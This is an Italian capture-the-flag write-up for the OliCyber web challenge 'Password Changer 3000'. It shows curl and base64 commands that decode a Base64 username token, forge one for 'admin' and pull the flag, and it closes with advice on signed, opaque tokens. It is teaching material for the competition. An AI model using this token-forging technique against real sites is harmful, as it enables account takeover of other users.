# Password Changer 3000

**Competizione:** OliCyber<br>
**Categoria:** Web<br>
**URL:** http://password-changer.challs.olicyber.it

---

## Descrizione

> Riesci a cambiare la password dell'utente "admin"?

Un'applicazione web che permette di cambiare password tramite token. Il token è vulnerabile.

---

## Soluzione

### Step 1 — Analisi iniziale

Proviamo a fare una richiesta POST alla home con un utente qualsiasi per capire come funziona il sito:

```bash
curl -v -X POST http://password-changer.challs.olicyber.it \
  -d "username=test" 2>&1 | grep -E "Location|302"
```

Il server risponde con un **302 Found** e ci redirige verso:

```
change-password.php?token=dGVzdA==
```

---

### Step 2 — Decodifica del token

Decodifichiamo subito il token per capire cosa contiene:

```bash
echo "dGVzdA==" | base64 -d
```

**Output:**
```
test
```

Il token è semplicemente l'username in chiaro, codificato in **Base64**.

---

### Step 3 — Identificazione della vulnerabilità

Il sito si fida ciecamente del valore del token per identificare l'utente e nessuna firma, nessun segreto. Chiunque può forgiare un token arbitrario semplicemente codificando in Base64 il nome utente desiderato.

Questo è un classico caso di **Insecure Direct Object Reference (IDOR)** combinato con una fiducia cieca in dati controllabili dal client.

---

### Step 4 — Costruzione del token per admin

Costruiamo il token per `admin`:

```bash
echo -n "admin" | base64
```

**Output:**
```
YWRtaW4=
```

---

### Step 5 — Exploit

Visitiamo direttamente `change-password.php` con il token forgiato:

```bash
curl "http://password-changer.challs.olicyber.it/change-password.php?token=YWRtaW4="
```

La risposta contiene la password la flag dell'utente `admin`.

---

## Conclusioni

> Base64 **non è cifratura**: solo encoding, reversibile da chiunque.

Un token sicuro deve essere:

- **Firmato** (es. HMAC) per garantire l'integrità
- **Opaco** (es. UUID casuale lato server) per non esporre informazioni sull'utente
- **Non predicibile** e non derivabile da informazioni pubbliche come l'username

La vulnerabilità sfruttata è un **IDOR (Insecure Direct Object Reference)** facilitato dall'uso di Base64 come mezzo di "protezione", un falso senso di sicurezza che non fornisce alcuna garanzia crittografica.